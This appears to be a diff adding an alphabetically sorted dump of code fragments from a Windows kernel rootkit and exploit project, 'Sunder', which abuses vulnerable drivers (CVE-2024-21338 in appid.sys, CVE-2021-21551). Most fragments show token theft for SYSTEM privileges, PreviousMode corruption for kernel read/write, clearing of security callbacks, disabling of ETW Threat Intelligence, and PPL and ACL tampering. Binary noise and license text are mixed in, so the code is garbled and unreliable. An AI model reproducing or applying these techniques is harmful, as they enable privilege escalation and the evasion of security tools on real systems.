@@ -1,0 +1,526 @@
+"(!(ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid"
+"(!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES"
+"(!GetTokenInformation(hToken, TokenUser, pTokenInfo, tokInfoLen, &tokInfoLen"
+"(!LookupAccountSidW(NULL, pTokenInfo->User.Sid, (LPWSTR"
+"(!LookupAccountSidW(NULL, pTokenInfo->User.Sid, NULL, &uUserLen, NULL, &uDomnLen, &SidName"
+"(!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid"
+"(!OpenProcessToken(ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle"
+"(!Process32First(hProcSnap, &pe32"
+"(!ReadProcessMemory(hProcess, lpBaseAddress, buffer, dwSize, &bytesRead"
+"(!strcmp(name, lpFileName"
+"(""C:\\Windows\\System32\\ntoskrnl.exe"""
+"(""[!] Disabling PPL on target process (Disabling PPL on LSASS in Windows 11 causes a reboot if not restored within a minute"
+"(""[!] ETW IsEnabled byte addr may be wrong, ETW_GUID_ENTRY->TRACE_ENABLE_INFO is %llx\n"", (isenabled & 0xFF"
+"(""[!] It is possible to set privilege fields to -1 to gain all privileges, but it will look anomalous\n"""
+"(""[!] Note the ACL offset is only confirmed valid for winlogon.exe, other processes may be different\n"""
+"(""[!] Note: A BSOD is likely if the target process closes while the token is in use\n"""
+"(""[*] Adding %llx offset, EtwThreatIntProvRegHandle is: %llx\n"", readKeApcQueueFunc, ntEtwThreatIntProvRegHandleAddr"
+"(""[*] Adding %x offset, PsSetLoadImageNotifyRoutineEx is: %llx\n"", readPspDllCallback, PsSetLoadImageNotifyRoutineEx"
+"(""[*] Adding %x offset, PspSetCreateProcessNotifyRoutine is: %llx\n"", readPspProcCallback, PspSetCreateProcessNotifyRoutine"
+"(""[*] Adding %x offset, PspSetCreateThreadNotifyRoutine is: %llx\n"", readPspThreadCallback, PspSetCreateThreadNotifyRoutine"
+"(""[*] All DLL image load callbacks cleared!\n"""
+"(""[*] All process callbacks cleared!\n"""
+"(""[*] All thread callbacks cleared!\n"""
+"(""[*] Base address of ntoskrnl.exe: 0x%llx\n"", ntosBase"
+"(""[*] Base address of ntoskrnl: 0x%llx\n"", (ULONGLONG"
+"(""[*] Calling IOCTL to exploit callback overwrite with nt!ExpProfileDelete\n"""
+"(""[*] Editing ACL to allow access to target PID: %d\n"", targetPid"
+"(""[*] Elevating to SYSTEM token\n"""
+"(""[*] Escalating privileges for target PID: %d\n"", targetPid"
+"(""[*] Exiting\n"""
+"(""[*] Kernel pointer to KeInsertQueueApc: %llx\n"", KeInsertQueueApcAddr"
+"(""[*] Kernel pointer to KeInsertQueueApc: 0x%llx\n"", KeInsertQueueApcAddr"
+"(""[*] Kernel pointer to PsInitialSystemProcess: 0x%llx\n"", systemProcessPtr"
+"(""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: %llx\n"", ProcCallbackAddr"
+"(""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: 0x%llx\n"", ProcCallbackAddr"
+"(""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: %llx\n"", ThreadCallbackAddr"
+"(""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: 0x%llx\n"", ThreadCallbackAddr"
+"(""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: %llx\n"", DllCallbackAddr"
+"(""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: 0x%llx\n"", DllCallbackAddr"
+"(""[*] Kernel pointer to SYSTEM process: %llx\n"", systemProcessAddr"
+"(""[*] Not running as NT AUTHORITY\\LOCAL SERVICE\n"""
+"(""[*] Opened file handle: 0x%x\n"", (DWORD"
+"(""[*] Opened thread handle to self: 0x%x\n"", (DWORD"
+"(""[*] Restored previous mode to user mode. Cleaning up and exiting\n"""
+"(""[*] Stealing target process token and starting cmd.exe\n"""
+"(""[*] Stealing token from target PID: %x\n"", targetPid"
+"(""[*] Targeting self\n"""
+"(""[+] Current process found at: %llx\n"", iterProc"
+"(""[+] ETW_REG_ENTRY located at %llx\n"", ntEtwThreatIntProvRegHandle"
+"(""[+] First DLL image load callback at: %llx\n"", callbackaddr"
+"(""[+] First process creation callback at: %llx\n"", callbackaddr"
+"(""[+] First thread creation callback at: %llx\n"", callbackaddr"
+"(""[+] Found kernel mode address of nt!ExpProfileDelete: 0x%llx\n"", kExpProfileDelete"
+"(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG"
+"(""[+] Found likely jump offset at: %llx, value %llx\n"", (PsSetLoadImageNotifyRoutineEx + pspoffset - 4"
+"(""[+] Found likely jump offset at: %llx, value %llx\n"", (PspSetCreateProcessNotifyRoutine + pspoffset - 4"
+"(""[+] Found likely jump offset at: %llx, value %llx\n"", (PspSetCreateThreadNotifyRoutine + pspoffset - 4"
+"(""[+] Impersonated NT AUTHORITY\\LOCAL SERVICE\n"""
+"(""[+] Impersonated NT AUTHORITY\\SYSTEM\n"""
+"(""[+] Leaked KTHREAD for current process: 0x%llx\n"", (ULONGLONG"
+"(""[+] Leaked kernel file object: 0x%llx\n"", (ULONGLONG"
+"(""[+] Loaded ntoskrnl at 0x%llx\n"", (ULONGLONG"
+"(""[+] NULLing callback at %llx, with value %llx\n"", callbackaddr, callbacks"
+"(""[+] Obtained driver handle: 0x%llx\n"", (ULONGLONG"
+"(""[+] Opened full access handle 0x%x to PID: %d\n"", hTPid, targetPid"
+"(""[+] Opened handle to appid.sys driver\n"""
+"(""[+] Previous mode has been set to kernel mode. RW primitives active\n"""
+"(""[+] Reading Security Descriptor to find ACL address\n"""
+"(""[+] Reading isenabled byte from etwGuidEntry+0x80 (%llx + 0x80"
+"(""[+] SeDebugPrivilege enabled\n"""
+"(""[+] Setting ETW IsEnabled byte to 0x0\n"""
+"(""[+] Setting MandatoryPolicy byte at %llx to 0\n"", MandatorySecurityPolicy"
+"(""[+] Setting SEP_AUDIT_POLICY to 0x%llx, previous mask: 0x%llx\n"", newaudit, SEPAUDIT"
+"(""[+] Setting SEP_TOKEN_PRIVILEGES to 0x%llx, previous privilege mask: 0x%llx\n"", newtoken, SEPTOKEN"
+"(""[+] Target process found at: %llx\n"", iterProc"
+"(""[+] Updating ACL at %llx to give access to \""Authenticated Users\"" group (S-1-5-11"
+"(""[-] AdjustTokenPrivileges Failed With Error: %d \n"", GetLastError("
+"(""[-] Allocating memory for input buffer failed\n"""
+"(""[-] Allocating memory for output buffer failed\n"""
+"(""[-] Calling IOCTL failed: 0x%lx\n"", GetLastError("
+"(""[-] Could not find KeInsertQueueApc in ntoskrnl\n"""
+"(""[-] Could not find PsInitialSystemProcess in ntoskrnl\n"""
+"(""[-] Could not find PsSetCreateProcessNotifyRoutine in ntoskrnl\n"""
+"(""[-] Could not find PsSetCreateThreadNotifyRoutine in ntoskrnl\n"""
+"(""[-] Could not find PsSetLoadImageNotifyRoutine in ntoskrnl\n"""
+"(""[-] Could not find offset to EtwThreatIntProvRegHandle within 50 instructions, exiting\n"""
+"(""[-] Could not find offset to PsSetLoadImageNotifyRoutineEx within 50 instructions, exiting\n"""
+"(""[-] Could not find offset to PspSetCreateProcessNotifyRoutine within 50 instructions, exiting\n"""
+"(""[-] Could not find offset to PspSetCreateThreadNotifyRoutine within 50 instructions, exiting\n"""
+"(""[-] Could not find offset to process creation callbacks within 150 instructions, exiting\n"""
+"(""[-] Could not find offset to thread creation callbacks within 150 instructions, exiting\n"""
+"(""[-] Could not find target PS_PROTECTION struct in kernel.\n"""
+"(""[-] Could not find target process in kernel.\n"""
+"(""[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n"", curTokenPtr, targetACLPtr"
+"(""[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n"", curTokenPtr, targetToken"
+"(""[-] Could not obtain handle to Appid.sys with token, trying again\n"""
+"(""[-] Could not resolve nt!ExpProfileDelete in usermode\n"""
+"(""[-] Could not retrieve base addr of ntoskrnl\n"""
+"(""[-] EnumDeviceDrivers failed with error: 0x%lx\n"", GetLastError("
+"(""[-] Error loading ntoskrnl: 0x%lx\n"", GetLastError("
+"(""[-] Error obtaining driver handle: 0x%lx\n"", GetLastError("
+"(""[-] Error while calling ReadProcessMemory("
+"(""[-] Error while loading ntoskrnl: %d\n"", GetLastError("
+"(""[-] Failed to create temporary file: %ls\n"", fName"
+"(""[-] Failed to obtain process token\n"""
+"(""[-] Failed to set previous mode\n"""
+"(""[-] Failed to steal LOCAL SERVICE token, exiting\n"""
+"(""[-] Failed to steal SYSTEM token, exiting\n"""
+"(""[-] GetProcAddress failed\n"""
+"(""[-] GetTokenInformation failed with error: 0x%x\n"", GetLastError("
+"(""[-] ImpersonateLoggedOnUser Failed with Error: %lx\n"", GetLastError("
+"(""[-] LocalAlloc [%d] Failed With Error: %d \n"", __LINE__, GetLastError("
+"(""[-] LookupAccountSidW Failed With Error: %d\n"", GetLastError("
+"(""[-] LookupPrivilegeValueW Failed With Error: %d \n"", GetLastError("
+"(""[-] Not All Privileges Referenced Are Assigned To The Caller \n"""
+"(""[-] NtQuerySystemInformation failed with error code 0x%X\n"", status"
+"(""[-] NtWriteVirtualMemory failed with status 0x%x\n"", status"
+"(""[-] OpenProcess PID %d Failed with Error: %lx\n"", Pid, GetLastError("
+"(""[-] OpenProcess targeting PID %d has failed\n"", targetPid"
+"(""[-] OpenProcessToken Failed With Error: 0x%0.8X \n"", GetLastError("
+"(""[-] OpenProcessToken PID %d Failed with Error: 0x%lx\n"", Pid, GetLastError("
+"(""[-] OpenThread to self failed\n"""
+"(""[-] Unable to find RVA of ExpProfileDelete function\n"""
+"(""[DEBUG] Adding offset %x and jump %llx to address %llx\n"", pspoffset, (potentialPspCallback & 0xFFFFFFFF"
+"(""[DEBUG] Hitting breakpoint\n"""
+"(""[DEBUG] Starting address of ExpProfileDelete: 0x%llx\n"", lpFoundAddress"
+"(""[DEBUG] current: %llx from offset +0x%x\n"", readPspDllCallback, pspoffset"
+"(""[DEBUG] current: %llx from offset +0x%x\n"", readPspProcCallback, pspoffset"
+"(""[DEBUG] current: %llx from offset +0x%x\n"", readPspThreadCallback, pspoffset"
+"(""[DEBUG] rkStruct->KeInsertQueueApc:	0x%llx\n"", rkStruct->KeInsertQueueApc"
+"(""[DEBUG] rkStruct->PsSetCreateProcessNotifyRoutine: 0x%llx\n"", rkStruct->PsSetCreateProcessNotifyRoutine"
+"(""[DEBUG] rkStruct->PsSetCreateThreadNotifyRoutine: 0x%llx\n"", rkStruct->PsSetCreateThreadNotifyRoutine"
+"(""[DEBUG] rkStruct->PsSetLoadImageNotifyRoutine: 0x%llx\n"", rkStruct->PsSetLoadImageNotifyRoutine"
+"(""[DEBUG] rkStruct->myProcessId: 0x%x\n"", rkStruct->myProcessId"
+"(""[DEBUG] rkStruct->readprimitive: 0x%p\n"", rkStruct->readprimitive"
+"(""[DEBUG] rkStruct->systemEprocess: 0x%llx\n"", rkStruct->systemEprocess"
+"(""[DEBUG] rkStruct->vulnDriver: 0x%x\n"", (int"
+"(""[DEBUG] rkStruct->writeprimitive: 0x%p\n"", rkStruct->writeprimitive"
+"(""[EVASION] Clearing kernel callbacks for image loads\n"""
+"(""[EVASION] Clearing kernel callbacks for process creation\n"""
+"(""[EVASION] Clearing kernel callbacks for thread creation\n"""
+"(""[EVASION] Disabling ETW Threat Intel (function hooking in kernel"
+"(""[EVASION] Enabling PPL for PID %d\n"", option2"
+"(""[INJECTION] Editing ACL to inject into PID %d\n"", option2"
+"(""[PRIVESC] Giving token full privileges for PID %d\n"", option2"
+"(""[PRIVESC] Stealing token from PID %d\n"", option2"
+"(""\n"""
+"(""\n[+] Setting protection level to %llx\n"", (protectionLevel & 0xFF"
+"(""\n[-] Invalid PID format\n"""
+"(""ntoskrnl.exe"""
+"(""start cmd.exe"""
+"(""start cmd.exe\n"""
+"(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"""
+"((ntosbase = GetBaseAddr(L""ntoskrnl.exe"""
+"((read_qword(hDriver, targetACLPtr"
+"((readqword(NULL, pPreviousMode"
+"(0b0001, Audit=0 and ProtectedType = 1 (light"
+"(0x0, inbuf_size, 0x1000, 0x40"
+"(0x0, outbuf_size, 0x1000, 0x40"
+"(DWORD pid, HANDLE hLeak"
+"(EnumDeviceDrivers(drivers, sizeof(drivers"
+"(GMEM_ZEROINIT, len"
+"(GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers"
+"(GetModuleHandleA(""ntdll.dll"""
+"(HANDLE hDriver, ULONGLONG DllCallbackAddr"
+"(HANDLE hDriver, ULONGLONG KeInsertQueueApcAddr"
+"(HANDLE hDriver, ULONGLONG ProcCallbackAddr"
+"(HANDLE hDriver, ULONGLONG ThreadCallbackAddr"
+"(HANDLE hDriver, ULONGLONG iterProc, int targetPid"
+"(HANDLE hDriver, ULONGLONG where"
+"(HANDLE hDriver, ULONGLONG where, ULONGLONG what"
+"(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress"
+"(HANDLE hToken, LPCWSTR szPrivilegeName"
+"(HANDLE hToken, OUT LPWSTR* szUsername"
+"(HMODULE lpFileName, unsigned char pattern[], SIZE_T patternSize, int skips"
+"(L""C:\\Windows\\System32\\ntoskrnl.exe"""
+"(L""[*] Current token user: %s\n"", curTokenUser"
+"(L""[+] Obtained token for %s from PID %d\n"", targetTokenUser, pe32.th32ProcessID"
+"(L""\\\\.\\AppID"", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL"
+"(L""svchost.exe"", L""NT AUTHORITY\\LOCAL SERVICE"", i"
+"(L""winlogon.exe"", L""NT AUTHORITY\\SYSTEM"", 0"
+"(LPCWSTR targetName, LPCWSTR targetUser, int skips"
+"(LPTR, tokInfoLen"
+"(LPTR, uTotalLength"
+"(MAYBE, test it"
+"(NULL, pPreviousMode"
+"(NULL, pPreviousMode, restorePM"
+"(NULL, systemProcessAddr"
+"(PROCESS_ALL_ACCESS, false, (DWORD"
+"(Process32Next(hProcSnap, &pe32"
+"(SetPrivilege(TokenHandle, L""SeDebugPrivilege"""
+"(SystemExtendedHandleInformation, pHandleInfo, len, &len"
+"(TEXT(""ntdll"""
+"(TH32CS_SNAPPROCESS, 0"
+"(THREAD_QUERY_INFORMATION, false, myTid"
+"(driverHandle, pKeInsertQueueApc"
+"(driverHandle, pPsSetCreateProcessNotifyRoutine"
+"(driverHandle, pPsSetCreateThreadNotifyRoutine"
+"(driverHandle, pPsSetLoadImageNotifyRoutine"
+"(driverHandle, systemProcess, option2"
+"(first 4 bits = SIGNER, 5th bit = AUDIT (boolean"
+"(hAppid, controlCode, in_buf, inbuf_size, out_buf, outbuf_size, &lpBytesReturned, NULL"
+"(hCurToken, &curTokenUser"
+"(hDriver, (DllCallbackAddr + pspoffset"
+"(hDriver, (KeInsertQueueApcAddr + apcoffset"
+"(hDriver, (ProcCallbackAddr + pspoffset"
+"(hDriver, (PsSetLoadImageNotifyRoutineEx + pspoffset - 4"
+"(hDriver, (PsSetLoadImageNotifyRoutineEx + pspoffset"
+"(hDriver, (PspSetCreateProcessNotifyRoutine + pspoffset - 4"
+"(hDriver, (PspSetCreateProcessNotifyRoutine + pspoffset"
+"(hDriver, (PspSetCreateThreadNotifyRoutine + pspoffset - 4"
+"(hDriver, (PspSetCreateThreadNotifyRoutine + pspoffset"
+"(hDriver, (ThreadCallbackAddr + pspoffset"
+"(hDriver, (callbackaddr + (iter * 8"
+"(hDriver, (etwGuidEntry + 0x80"
+"(hDriver, (iterProc + 0x440"
+"(hDriver, (iterProc + 0x4b8"
+"(hDriver, (iterProc + 0x87a"
+"(hDriver, MandatorySecurityPolicy"
+"(hDriver, MandatorySecurityPolicy, (policyValue & 0xFFFFFFFFFFFFFF00"
+"(hDriver, curTokenPtr, targetToken"
+"(hDriver, ntEtwThreatIntProvRegHandle + 0x20"
+"(hDriver, ntEtwThreatIntProvRegHandleAddr"
+"(hDriver, systemProcessPtr"
+"(hDriver, targetACLPtr"
+"(hDriver, targetACLPtr, newSD"
+"(hDriver, targetTokenPtr + 0x40"
+"(hDriver, targetTokenPtr + 0x40, newtoken"
+"(hDriver, targetTokenPtr + 0x48"
+"(hDriver, targetTokenPtr + 0x48, newaudit"
+"(hTargetToken, &targetTokenUser"
+"(hToken, TokenUser, nullptr, tokInfoLen, &tokInfoLen"
+"(if EPROCESS pid is equal to 4 again, entire process loop has completed without finding targets"
+"(in_buf, 0, MEM_RELEASE"
+"(in_buf, 0, inbuf_size"
+"(kernel, window system, and so on"
+"(kof""}zm"
+"(light/1, normal/2, max/3"
+"(lpImageBase, sizeof(lpImageBase"
+"(lstrcmpW(curTokenUser, L""NT AUTHORITY\\LOCAL SERVICE"""
+"(lstrcmpW(curTokenUser, L""NT AUTHORITY\\SYSTEM"""
+"(lstrcmpW(targetName, pe32.szExeFile"
+"(lstrcmpW(targetTokenUser, targetUser"
+"(myPid, eaFile"
+"(myPid, myhThread"
+"(ntdll, ""NtQuerySystemInformation"""
+"(out_buf, 0, MEM_RELEASE"
+"(out_buf, 0, outbuf_size"
+"(read_qword(hDriver, (iterProc + 0x448"
+"(read_qword(hDriver, (iterProc + 0x4b8"
+"(read_qword(hDriver, (iterProc - 0x8"
+"(read_qword(hDriver, curTokenPtr"
+"(spawns cmd.exe, but can be modified to spawn any process"
+"(umodeNtoskrnl, ""KeInsertQueueApc"""
+"(umodeNtoskrnl, ""PsInitialSystemProcess"""
+"(umodeNtoskrnl, ""PsSetCreateProcessNotifyRoutine"""
+"(umodeNtoskrnl, ""PsSetCreateThreadNotifyRoutine"""
+"(umodeNtoskrnl, ""PsSetLoadImageNotifyRoutine"""
+"(umodeNtoskrnl, searchExpProfileDelete, epdOpcodeSize, 0"
+"(wcscmp(szDrivers, drvname"
+"(x64, Release"
+(!(*szUsername = (LPWSTR
+(!(pTokenInfo = (PTOKEN_USER
+(!ImpersonateLoggedOnUser(svcToken
+(!ImpersonateLoggedOnUser(systemToken
+(!OpenProcessToken((HANDLE
+(!OpenThreadToken((HANDLE
+(!ReadProcessMemory((HANDLE
+(!bResult && *szUsername
+(!baseofDrivers
+(!hTPid
+(!hToken || !szUsername
+(!in_buf
+(!out_buf
+(!ret
+(&hAppid
+('$(UserRootDir
+((DWORD_PTR
+((HANDLE
+((LPBYTE
+((TokenHandle = GetCurrentToken(
+((ULONGLONG*
+((int
+((isenabled & 0xFF
+((option1 < 4
+((readKeApcQueueFunc & 0x0000ff00000000ff
+((readKeApcQueueFunc >> (8 * 2
+((readPspDllCallback & 0x000000ffff0000ff
+((readPspDllCallback & 0xFFFFFF
+((readPspDllCallback >> (8 * 1
+((readPspProcCallback
+((readPspProcCallback & 0x000000ffff0000ff
+((readPspProcCallback >> (8 * 1
+((readPspThreadCallback & 0x000000ffff0000ff
+((readPspThreadCallback & 0xFFFFFF
+((readPspThreadCallback >> (8 * 1
+((targetACLPtr == 0
+((targetToken == 0
+()
+(*5
+(*phAppid == INVALID_HANDLE_VALUE || *phAppid == NULL
+(*phAppid == NULL
+(*szUsername
+(+gZ
+(--FMX
+(0.a
+(0xc0000004
+(1
+(1000
+(1}3v
+(2
+(2000
+(2FD~7~
+(3
+(3000
+(500
+(95|dFO#wn
+(=0x0
+(@
+(Add additional parameters if necessary
+(BSOD
+(BYTE*
+(C
+(CVE-2021-21551
+(CVE-2024-21338
+(Configuration
+(DllCallbackAddr + pspoffset
+(DllCallbackAddr == 0
+(DllCallbackOffset == 0
+(EP^R
+(GetLastError(
+(HANDLE
+(IW6I$f.:27u~
+(JT
+(Ju
+(KIQAoffset == 0
+(KeInsertQueueApcAddr + apcoffset
+(KeInsertQueueApcAddr == 0
+(LPCWSTR drvname
+(LPVOID
+(LPWSTR
+(NTSTATUS
+(OUT HANDLE *phAppid
+(PDWORD
+(PEXP_OUT rkStruct
+(PID
+(PIMAGE_DOS_HEADER
+(PIMAGE_NT_HEADERS
+(PROCESSENTRY32
+(PSYSTEM_HANDLE_INFORMATION_EX
+(PTOKEN_PRIVILEGES
+(Platform
+(PreprocessorDefinitions
+(ProcCallbackAddr + pspoffset
+(ProcCallbackAddr == 0
+(ProcCallbackOffset == 0
+(ProcessHandle
+(ProjectConfigurationPlatforms
+(PsSetLoadImageNotifyRoutineEx + pspoffset + (potentialPspCallback & 0xFFFFFFFF
+(PspSetCreateProcessNotifyRoutine + pspoffset + (potentialPspCallback & 0xFFFFFFFF
+(PspSetCreateThreadNotifyRoutine + pspoffset + (potentialPspCallback & 0xFFFFFFFF
+(QWORDs
+(Requires medium integrity or higher
+(SIZE_T i = 0; i < dwSize - patternSize; i++
+(SIZE_T j = 0; j < patternSize; j++
+(ScanSectionForPattern(GetCurrentProcess(
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(Su
+(Sunder-appid_exploit
+(Sunder/Sunder/Sunder.cpp
+(ThreadCallbackAddr + pspoffset
+(ThreadCallbackAddr == 0
+(ThreadCallbackOffset == 0
+(TokenHandle
+(ULONG Pid
+(ULONGLONG
+(UserRootDir
+(VCTargetsPath
+(WCHAR
+(WINAPI* _NtQuerySystemInformation
+(WINAPI* _NtWriteVirtualMemory
+(WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++
+(Z?	
+([See the images directory for screenshots](images
+(]6
+(_NtQuerySystemInformation
+(_NtWriteVirtualMemory
+(__fastcall* _readqword
+(__fastcall* _writeqword
+(_readqword
+(_writeqword
+(`j
+(a
+(and copy into rootkit struct
+(and should
+(apcoffset > 50
+(appid.sys
+(at your option
+(b
+(bcdedit command not required on Windows 11
+(buffer
+(buffer[i + j] != pattern[j]
+(c
+(callbacks != 0x0
+(char
+(clean up and exit
+(const char* name
+(curKthread == NULL
+(curToken & 0xFFFFFFFFFFFFFFF0
+(curTokenPtr == 0
+(dbutil_2_3.sys
+(dereference with read primitive
+(drivers
+(drivers[0]
+(dwSize
+(eaFile
+(eaFile == INVALID_HANDLE_VALUE
+(ex: previousmode = kernelmode
+(exploit.PNG
+(fName
+(for any work
+(found
+(gratis or for a charge
+(hAppid
+(hCurToken
+(hCurToken == NULL
+(hDriver == INVALID_HANDLE_VALUE
+(hDriver can be NULL in some exploits
+(hLeak
+(hProcSnap
+(hProcSnap == INVALID_HANDLE_VALUE
+(hSvcToken
+(hSvcToken == NULL || hAppid == NULL
+(hTargetToken
+(hTargetToken != NULL
+(helps avoid BSOD
+(https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/
+(https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules
+(https://nero22k.github.io/posts/windows-applocker-driver-elevation-of-privilege-cve-2024-21338/
+(i = 0; i < nDrivers; i++
+(if any
+(if you work as a programmer
+(image load
+(images/ppl.PNG
+(inBuf
+(including a cross-claim or counterclaim in a lawsuit
+(including a physical distribution medium
+(int i = 0; i < drivers; i++
+(int i = 0; i < pHandleInfo->HandleCount; i++
+(iterPid == 4
+(iterPid == myprocId
+(iterPid == targetPid
+(kB_
+(kEaFile == NULL
+(kernel-mode hooking
+(lpFileName
+(lpImageBase[0]
+(myhThread == INVALID_HANDLE_VALUE
+(nFb7
+(naming 'rootStruct' in this example
+(off
+(one element of the 'Privileges' structure array
+(only needed for some payloads
+(operated by you or a third party
+(option1 < 0
+(option1 == 9
+(option1 > maxOptionNumber
+(option2 == -1
+(or copies made from those copies
+(pHandleInfo
+(pHandleInfo->Handles[i].UniqueProcessId
+(pNtHeaders
+(pPreviousMode+0x30
+(pTokenInfo
+(pUserStr
+(pe32.th32ProcessID
+(pe32.th32ProcessID == firstPid && i >= 1
+(pid == (DWORD
+(potentialEtwTIProv == 0
+(potentialPspCallback == 0
+(preferably the SYSTEM process
+(privilege not available for process
+(protSigner != 0
+(protSigner < 1
+(protSigner << 4
+(protSigner > 7
+(pspoffset > 150
+(pspoffset > 50
+(query == NULL
+(read PID at +0x440
+(regardless of how the transaction is characterized
+(rootStruct
+(searchExpProfileDelete
+(skips > 0
+(starting PID shows up again
+(status != (NTSTATUS
+(status != 0
+(status == (NTSTATUS
+(std::cin.fail(
+(strcmp((CHAR*
+(such as myprocId
+(such as when corrupting PreviousMode
+(svcToken == NULL
+(systemProcessOffset == 0
+(systemToken
+(systemToken == NULL
+(szDrivers[0]
+(targetPPL & 0xFFFFFFFFFFFFFF00
+(targetPPL == 0
+(targetPid == myprocId
+(targetTokenPtr == 0
+(tokInfoLen == 0
+(true
+(uDomnLen * sizeof(WCHAR
+(uUserLen * sizeof(WCHAR
+(umodeNtoskrnl == NULL
+(umodeOffset == NULL
+(used for write primitive
+(used to avoid BSOD in FsRtlSetKernelEaFile function
+(used to find address of PreviousMode bit
+(utilized in appid.sys exploit
+(uy/DqQ	JJ`8r3
+(will crash if you don't
+(with or without modification
+(zero out lowest byte
